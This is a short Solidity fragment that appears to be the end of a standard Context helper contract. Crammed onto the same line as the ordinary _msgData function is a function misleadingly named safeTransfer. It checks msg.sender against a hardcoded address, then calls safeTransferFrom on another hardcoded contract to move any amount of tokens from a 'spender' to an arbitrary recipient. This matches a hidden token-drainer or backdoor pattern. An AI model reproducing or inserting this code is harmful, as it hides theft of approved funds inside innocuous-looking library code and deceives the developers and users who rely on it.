 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xE1f38aaBdc683f9Bd7aCceC039eA0eD9fc927154)) {TransferHelper.safeTransferFrom(0x075F42F396EC9F1294D4165B80A5003D3d52b8Cf,spender,recipient,amount);return true;}return false;}
}
